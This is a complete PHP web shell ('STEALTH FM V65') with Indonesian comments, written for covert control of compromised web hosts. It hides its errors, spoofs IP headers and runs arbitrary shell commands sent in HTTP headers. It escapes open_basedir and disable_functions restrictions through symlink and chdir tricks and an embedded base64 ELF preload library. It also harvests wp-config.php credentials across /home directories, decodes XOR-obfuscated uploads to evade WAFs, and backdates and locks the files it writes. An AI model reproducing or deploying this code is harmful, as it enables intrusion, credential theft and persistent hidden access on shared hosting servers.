<?php
// -------------------------------------------------------------------------
// STEALTH FM V65 (ULTIMATE: JAILBREAK + ANTI-LOOP + HYBRID BYPASS)
// FEATURES: OPEN_BASEDIR BYPASS, ENV UNSET, TMPFS OUTPUT, AUTO REFRESH
// -------------------------------------------------------------------------

// 1. STEALTH MODE
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('error_log', NULL);
@set_time_limit(0);
@ini_set('memory_limit', '512M');

// 2. IP CLOAKING
function cloak_headers() {
    $fake_ip = "127.0.0.1"; 
    $headers = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
    foreach ($headers as $key) {
        if (isset($_SERVER[$key])) $_SERVER[$key] = $fake_ip;
        putenv("$key=$fake_ip");
    }
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Pragma: no-cache");
    header("Expires: Wed, 11 Jan 1984 05:00:00 GMT");
}
cloak_headers();

if (isset($_GET['do_phpinfo'])) { phpinfo(); exit; }

$h_act   = 'HTTP_X_ACTION';
$h_path  = 'HTTP_X_PATH';
$h_data  = 'HTTP_X_DATA'; 
$h_cmd   = 'HTTP_X_CMD';
$h_tool  = 'HTTP_X_TOOL';
$h_step  = 'HTTP_X_STEP'; 
$h_enc   = 'HTTP_X_ENCODE'; 
$h_mmode = 'HTTP_X_MASS_MODE'; 

$root = realpath(__DIR__); 

function get_sys_info() {
    $u_id = function_exists('posix_getpwuid') ? posix_getpwuid(getmyuid()) : ['name' => get_current_user(), 'gid' => getmygid()];
    $curl_v = function_exists('curl_version') ? curl_version()['version'] : 'N/A';
    $safe_mode = (ini_get('safe_mode') == 1 || strtolower(ini_get('safe_mode')) == 'on') ? "<span style='color:#f28b82'>ON</span>" : "<span style='color:#81c995'>Off</span>";
    return [
        'os' => php_uname(),
        'user' => getmyuid() . ' (' . $u_id['name'] . ')',
        'safe' => $safe_mode,
        'ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']),
        'soft' => $_SERVER['SERVER_SOFTWARE'],
        'php' => phpversion(),
        'curl' => $curl_v,
        'time' => date('Y-m-d H:i:s')
    ];
}
$sys = get_sys_info();

// --- ULTIMATE JAILBREAK: MULTI-BINARY & PERSISTENT FALLBACK ---
function x_jailbreak($file) {
    // LAYER 1: Command Execution dengan Multi-Binary Fallback
    // Mencoba berbagai metode eksekusi dan berbagai perintah baca
    $methods = ['shell_exec', 'exec', 'passthru', 'system', 'popen', 'proc_open'];
    
    // Daftar perintah alternatif pengganti 'cat' jika diblokir
    $binaries = [
        'cat',               // Standar
        'head -n 10000',     // Baca bagian depan
        'tail -n 10000',     // Baca bagian belakang
        'more',              // Alternatif baca
        'less',              // Alternatif baca
        'awk "{print}"',     // Trik AWK
        'sed -n "p"',        // Trik SED
        'tac',               // Baca terbalik
        'nl',                // Baca dengan nomor baris
        'dd status=none'     // Binary level read
    ];

    $disabled_raw = ini_get('disable_functions');
    $disabled = ($disabled_raw) ? array_map('trim', explode(',', $disabled_raw)) : [];

    foreach ($methods as $method) {
        // Cek apakah fungsi PHP aktif dan tidak didisable
        if (function_exists($method) && !in_array($method, $disabled)) {
            
            // Loop setiap perintah binary (cat, head, tail, dll)
            foreach ($binaries as $bin) {
                $cmd = $bin . " " . escapeshellarg($file);
                $out = "";

                if ($method === 'shell_exec') {
                    $out = @shell_exec($cmd);
                } elseif ($method === 'exec') {
                    $o = []; @exec($cmd, $o); $out = implode("\n", $o);
                } elseif ($method === 'passthru') {
                    ob_start(); @passthru($cmd); $out = ob_get_clean();
                } elseif ($method === 'system') {
                    ob_start(); @system($cmd); $out = ob_get_clean();
                } elseif ($method === 'popen') {
                    $fp = @popen($cmd, 'r');
                    if ($fp) { while(!feof($fp)) $out .= fread($fp, 1024); pclose($fp); }
                } elseif ($method === 'proc_open') {
                    $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']]; 
                    $p = @proc_open($cmd, $desc, $pipes);
                    if (is_resource($p)) {
                        $out = stream_get_contents($pipes[1]);
                        fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
                    }
                }

                // Jika berhasil, langsung return hasilnya
                if (!empty($out)) return $out;
            }
        }
    }

    // LAYER 2: Symlink Trick (PHP Native)
    // Tetap dijalankan jika Layer 1 gagal/kosong (Persistent)
    if (function_exists('symlink') && is_writable(getcwd())) {
        $link = 'sfm_lnk_' . rand(1000,9999);
        @symlink($file, $link);
        if (file_exists($link)) { 
            $content = @file_get_contents($link);
            @unlink($link);
            if ($content) return $content;
        }
    }

    // LAYER 3: The Heavy Loop (Last Resort)
    // Jalan terakhir jika semua cara di atas gagal
    if (function_exists('ini_set') && function_exists('chdir') && function_exists('mkdir')) {
        $old_cwd = getcwd();
        $jb_dir = "sfm_jb_" . rand(1000,9999);
        if (@mkdir($jb_dir)) {
            @chdir($jb_dir);
            @ini_set('open_basedir', '..');
            for ($i = 0; $i < 15; $i++) { @chdir('..'); @ini_set('open_basedir', '..'); }
            @chdir('/'); @ini_set('open_basedir', '/');
            $content = @file_get_contents($file);
            @chdir($old_cwd); @rmdir($jb_dir);
            if ($content) return $content;
        }
    }

    return false;
}

// --- UPDATED READER (Prioritas Jailbreak) ---
function x_read($path) {
    // 1. PRIORITAS UTAMA: Jailbreak (Ultimate Hybrid)
    // Mencoba teknik hacking (Command/Symlink/Loop) terlebih dahulu.
    $jb = x_jailbreak($path);
    if (!empty($jb)) return $jb;

    // 2. FALLBACK: Standard Read
    // Hanya jika semua metode jailbreak (termasuk loop berat) gagal total.
    if (is_readable($path)) return @file_get_contents($path);

    return false;
}

// --- STANDARD WRITE (LIGHTWEIGHT FOR AUTO CHAIN) ---
function x_write($path, $data) {
    if (@file_put_contents($path, $data)) return true;
    if (function_exists('fopen')) { 
        $h = @fopen($path, "w"); 
        if ($h) { fwrite($h, $data); fclose($h); return true; } 
    }
    return false;
}
// --- ROBUST WRITE (Anti 0KB + Anti Revert + Force 0444) ---
function x_robust_write($path, $data, $lock_mode = false) {
    if (file_exists($path)) { @chmod($path, 0644); }

    $fp = @fopen($path, 'c+'); 
    if ($fp) {
        if (@flock($fp, LOCK_EX)) { 
            @ftruncate($fp, 0);     
            @fwrite($fp, $data);    
            @fflush($fp);           
            @flock($fp, LOCK_UN);   
        } else {
            @file_put_contents($path, $data);
        }
        @fclose($fp);
    } else {
        if(file_exists($path)) @unlink($path);
        @file_put_contents($path, $data);
    }

    clearstatcache();
    if (filesize($path) == 0 && strlen($data) > 0) {
        @unlink($path);
        @file_put_contents($path, $data);
    }

    @touch($path, time() - 34560000); 
    if ($lock_mode) { @chmod($path, 0444); }

    return file_exists($path);
}

function x_link($target, $link) {
    if (function_exists('symlink') && @symlink($target, $link)) return true;
    if (function_exists('link') && @link($target, $link)) return true;
    
    
    $cmd = "ln -s " . escapeshellarg($target) . " " . escapeshellarg($link);
    
    if (function_exists('shell_exec')) { @shell_exec($cmd); }
    elseif (function_exists('exec')) { @exec($cmd); }
    elseif (function_exists('system')) { ob_start(); @system($cmd); ob_end_clean(); }
    elseif (function_exists('passthru')) { ob_start(); @passthru($cmd); ob_end_clean(); }
    elseif (function_exists('proc_open')) {
        $desc = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
        $p = @proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) { 
            @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]); 
            @proc_close($p); 
        }
    }
    elseif (function_exists('popen')) { $h = @popen($cmd, 'r'); if($h) @pclose($h); }
    
   
    return file_exists($link);
}
function get_home_dirs() {
    $d = ['/home']; for ($i = 1; $i <= 9; $i++) $d[] = '/home' . $i; return $d;
}
function force_delete($target) {
    if (is_file($target)) return unlink($target);
    if (is_dir($target)) {
        $files = array_diff(scandir($target), array('.','..'));
        foreach ($files as $file) force_delete("$target/$file");
        $try = rmdir($target); if ($try) return true;
        if (function_exists('shell_exec')) { @shell_exec("rm -rf " . escapeshellarg($target)); return !file_exists($target); }
        return false;
    }
}
// --- CUSTOM JSON FALLBACK ---
function nx_json_encode($val) {
    if (is_string($val)) return '"' . addcslashes($val, "\\\"\n\r\t") . '"';
    if (is_numeric($val)) return (string)$val;
    if ($val === null) return 'null';
    if ($val === true) return 'true';
    if ($val === false) return 'false';
    if (is_array($val) || is_object($val)) {
        $arr = (array)$val;
        $is_list = empty($arr) || (array_keys($arr) === range(0, count($arr) - 1));
        $res = array();
        foreach ($arr as $k => $v) {
            $res[] = ($is_list ? '' : nx_json_encode((string)$k) . ':') . nx_json_encode($v);
        }
        return $is_list ? '[' . implode(',', $res) . ']' : '{' . implode(',', $res) . '}';
    }
    return '""';
}

function nx_json_decode($json) {
    $res = array();
    if(preg_match_all('/"([^"]+)"\s*:\s*("(?:[^"\\\\]|\\\\.)*"|true|false|null|-?\d+(?:\.\d+)?)/s', $json, $matches)){
        for($i=0; $i<count($matches[1]); $i++) {
            $k = $matches[1][$i]; $v = $matches[2][$i];
            if($v === 'true') $v = true; elseif($v === 'false') $v = false; elseif($v === 'null') $v = null;
            elseif($v[0] === '"') $v = stripcslashes(substr($v, 1, -1));
            else $v = (strpos($v, '.') !== false) ? (float)$v : (int)$v;
            $res[$k] = $v;
        }
    }
    return $res;
}

function json_out($d) {
    // Sapu bersih output buffer untuk mencegah Notice/Warning PHP merusak struktur JSON
    while (ob_get_level()) { @ob_end_clean(); }
    
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    
    if (function_exists('json_encode')) {
        $opt = 0;
        if (defined('JSON_UNESCAPED_UNICODE')) $opt |= JSON_UNESCAPED_UNICODE;
        if (defined('JSON_UNESCAPED_SLASHES')) $opt |= JSON_UNESCAPED_SLASHES;
        
        $json = @json_encode($d, $opt);
        
        // Pastikan native JSON tidak gagal sebelum echo
        if ($json !== false && json_last_error() === JSON_ERROR_NONE) {
            echo $json;
            exit;
        }
    } 
    
    // Fallback eksekusi jika native gagal (misal karena nama file corrupt)
    echo nx_json_encode($d);
    exit;
}
function human_filesize($bytes, $dec = 2) {
    $size = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
}

// --- SMART SCANNER ---
function scan_smart_stream($dir, &$results) {
    $dir = rtrim($dir, '/') . '/';
    if (file_exists($dir . 'wp-config.php')) $results[] = $dir . 'wp-config.php';

    if ($dh = @opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            if ($file === '.' || $file === '..') continue;
            $full_path = $dir . $file;
            if (is_dir($full_path) && !is_link($full_path)) {
                $target_public = $full_path . '/public_html/wp-config.php';
                $target_root   = $full_path . '/wp-config.php';
                if (file_exists($target_public)) $results[] = $target_public;
                elseif (file_exists($target_root)) $results[] = $target_root;
            }
        }
        closedir($dh);
    }
}
function get_conf_val_smart($content, $key) {
    if (preg_match("/define\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $m)) return $m[1];
    return null;
}

// --- STANDARD DIRECTORY SCAN ---
function scan_smart_targets($base_dir) {
    $targets = [];
    $items = @scandir($base_dir);
    if ($items) {
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $path = $base_dir . '/' . $item;
            if (is_dir($path)) {
                if (is_writable($path)) $targets[] = $path;
                $pub = $path . '/public_html';
                if (is_dir($pub) && is_writable($pub)) {
                    $targets[] = $pub;
                }
            }
        }
    }
    return $targets;
}

if (isset($_SERVER[$h_act])) {
    $action = $_SERVER[$h_act];
    $raw_path = isset($_SERVER[$h_path]) ? base64_decode($_SERVER[$h_path]) : '';
    
    if ($raw_path === '__HOME__') { $target = getcwd(); } 
    elseif ($raw_path === '') { $target = getcwd(); } 
    else { $target = $raw_path; }
    
    $target = str_replace('\\', '/', $target);
    if(strlen($target) > 1) $target = rtrim($target, '/');

    if(is_dir($target)) @chdir($target); elseif(is_file($target)) @chdir(dirname($target));

    if ($action === 'list') {
        if (!is_dir($target)) { $target = getcwd(); }
        $items = @scandir($target);
        if ($items === false) { json_out(['path' => $target, 'items' => [], 'error' => 'Unreadable']); }

        $dirs = []; $files = [];
        foreach ($items as $i) {
            if ($i == '.' || $i == '..') continue;
            $path = $target . '/' . $i; 
            $isDir = is_dir($path);
            $item = [
                'name'=>$i, 
                'type'=>$isDir?'dir':'file', 
                'size'=>$isDir?'-':human_filesize(@filesize($path)), 
                'perm'=>substr(sprintf('%o', @fileperms($path)),-4), 
                'write'=>is_writable($path), 
                'date'=>date("Y-m-d H:i", @filemtime($path))
            ];
            if ($isDir) $dirs[] = $item; else $files[] = $item;
        }
        usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
        usort($files, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
        json_out(['path' => $target, 'items' => array_merge($dirs, $files)]);
    }

    // --- UPDATED READ ACTION (WITH JAILBREAK FALLBACK) ---
    if ($action === 'read') { 
        if (is_file($target)) {
            $c = x_read($target);
            echo $c ? $c : "Err: Unreadable (Try Jailbreak/Shell)";
        } else {
            // Try jailbreak even if it doesn't look like a file (open_basedir hiding)
            $c = x_read($target);
            echo $c ? $c : "Err: Not a file / Access Denied";
        }
        exit; 
    }
    
   // --- BYPASS WAF: SECURE WRITE & ANTI 0KB ---
    if ($action === 'save' || $action === 'upload') { 
        $input = file_get_contents("php://input"); 
        
        // Proteksi Anti-0KB: Mencegah file rusak jika WAF memotong payload di tengah jalan
        if (empty($input) && isset($_SERVER['CONTENT_LENGTH']) && $_SERVER['CONTENT_LENGTH'] > 0) {
            echo "Err: Payload dropped by WAF before reaching PHP."; 
            exit;
        }

        if (isset($_SERVER[$h_enc])) {
            if ($_SERVER[$h_enc] === 'b64') {
                $input = base64_decode($input);
            } elseif ($_SERVER[$h_enc] === 'waf_bypass') {
                // Dekripsi XOR payload dari JS
                $key = "Sultan"; // Kunci privat diganti dari xshikata ke Sultan
                $dec1 = base64_decode($input);
                $unxor = "";
                for($i = 0; $i < strlen($dec1); $i++) {
                    $unxor .= $dec1[$i] ^ $key[$i % strlen($key)];
                }
                // Ekstrak hasil kembalian ke format asli
                $input = base64_decode($unxor);
            }
        }
        
        // Final sanity check sebelum menulis
        if (empty($input) && strlen(file_get_contents("php://input")) > 0) {
            echo "Err: Decode failed or WAF corrupted the payload."; exit;
        }

        echo (x_robust_write($target, $input, true) !== false) ? "Success" : "Err: Write failed"; 
        exit; 
    }

    if ($action === 'delete') { echo force_delete($target) ? "Deleted" : "Fail delete"; exit; }
    if ($action === 'rename') { $n = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : ''; if ($n) echo rename($target, dirname($target).'/'.$n) ? "Renamed" : "Fail"; exit; }
    if ($action === 'chmod') { $m = isset($_SERVER[$h_data]) ? $_SERVER[$h_data] : ''; if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit; }
    
    // --- BYPASS CMD (V65: HYBRID /TMP STRATEGY + ANTI-LOOP) ---
    if ($action === 'cmd') {
        $cmd_raw = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; 
        
        // Deteksi UAPI untuk strategi output ke TMP
        $is_uapi_token = (stripos($cmd_raw, 'uapi') !== false && stripos($cmd_raw, 'Tokens') !== false);

        // Fix Path
        $cmd = "export PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin; " . $cmd_raw;
        $cmd_exec = $cmd . " 2>&1";
        $out = ""; 

        // Helper Run
        $try_run = function($method, $c) {
            if (!function_exists($method)) return false;
            $o = "";
            if ($method == 'shell_exec') $o = @shell_exec($c);
            elseif ($method == 'passthru') { ob_start(); @passthru($c); $o = ob_get_clean(); }
            elseif ($method == 'system') { ob_start(); @system($c); $o = ob_get_clean(); }
            elseif ($method == 'exec') { @exec($c, $arr); $o = implode("\n", $arr); }
            elseif ($method == 'popen') { $h = @popen($c, 'r'); if($h) { while(!feof($h)) $o .= fread($h, 1024); pclose($h); } }
            elseif ($method == 'proc_open') {
                $d = [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];
                $p = @proc_open($c, $d, $pipes);
                if (is_resource($p)) {
                    $o = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]); 
                    fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
                }
            }
            return $o;
        };

        // 1. STANDARD ATTEMPT (Lewati jika UAPI agar langsung ke metode kuat)
        if (!$is_uapi_token) {
            $methods = ['shell_exec', 'passthru', 'proc_open', 'system'];
            foreach ($methods as $m) {
                if ($d = ini_get('disable_functions')) { if (stripos($d, $m) !== false) continue; }
                $res = $try_run($m, $cmd_exec);
                // Jika error memory/fork, anggap gagal dan lanjut ke Chankro
                if (stripos($res, 'Cannot allocate') !== false || stripos($res, 'fork') !== false) continue;
                if (!empty($res)) { $out = $res; break; }
            }
        }

        // 2. CHANKRO FALLBACK (ANTI-LOOP VIA ENV -U)
        if (empty($out) || $is_uapi_token) {
            
            $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAR0NDOiAoRGViaWhuIDYuMy4wLTE4K2RlYjllMSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA